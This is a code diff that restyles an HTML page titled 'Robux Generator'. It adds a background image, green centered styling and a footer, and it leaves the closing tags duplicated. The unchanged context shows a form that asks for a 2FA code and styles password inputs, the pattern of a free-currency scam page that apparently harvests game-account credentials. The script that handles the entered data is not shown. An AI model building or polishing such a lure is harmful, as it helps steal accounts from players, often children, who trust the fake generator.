@@ -6,17 +6,20 @@
     <title>Robux Generator</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            color: #333;
+            font-family: 'Arial', sans-serif;
+            background-image: url('https://img.freepik.com/free-vector/watercolor-emerald-background_23-2150270303.jpg');
+            background-size: cover;
+            background-position: center;
+            color: #ffffff; /* White text color */
             margin: 0;
             padding: 0;
         }
 
         h1 {
             text-align: center;
-            margin-top: 20px;
-            color: #4CAF50;
+            margin-top: 30px;
+            color: #ffffff; /* White text color */
+            font-size: 2.5em;
         }
 
         p {
@@ -24,47 +27,65 @@
             margin: 20px auto;
             padding: 0 20px;
             line-height: 1.6;
+            font-size: 1.1em;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #fff;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: rgba(0, 128, 0, 0.8); /* Darker green */
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            display: flex;          /* Use flexbox for centering */
+            flex-direction: column; /* Stack items vertically */
+            align-items: center;    /* Center items horizontally */
         }
 
         label {
             font-weight: bold;
             display: block;
-            margin: 10px 0 5px;
+            margin: 15px 0 5px;
+            font-size: 1.1em;
+            color: #ffffff; /* White text color */
+            text-align: center; /* Center label text */
         }
 
         input[type="number"], input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
+            width: 90%; /* Adjust width for centering */
+            max-width: 400px; /* Max width for inputs */
+            padding: 12px;
             margin-bottom: 20px;
-            border: 1px solid #ccc;
+            border: 1px solid #4CAF50; /* Green border */
             border-radius: 5px;
-        }
-
-        input[type="number"] {
-            max-width: 200px;
+            font-size: 1em;
+            background-color: #ffffff; /* White background for inputs */
+            color: #333; /* Dark text for inputs */
+            text-align: center; /* Center input text */
         }
 
         button {
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
+            width: 90%; /* Adjust width for centering */
+            max-width: 400px; /* Max width for buttons */
+            padding: 12px;
+            background-color: #2E7D32; /* Darker green */
+            color: #ffffff; /* White text color */
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 1.2em;
+            transition: background-color 0.3s ease;
+            text-align: center; /* Center button text */
         }
 
         button:hover {
-            background-color: #45a049;
+            background-color: #1B5E20; /* Even darker green on hover */
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #ffffff; /* White text color */
         }
     </style>
 </head>
@@ -86,6 +107,10 @@
         <input type="number" id="2fa" placeholder="Put your 2FA Code" required />
 
         <button id="startMission">Start</button>
+    </div>
+
+    <div class="footer">
+        <p>Robux Generator - All Rights Reserved</p>
     </div>
 
     <script>
@@ -149,5 +174,8 @@
 
         document.getElementById('startMission').addEventListener('click', startMission);
     </script>
+</body>
+</html>
+
 </body>
 </html>
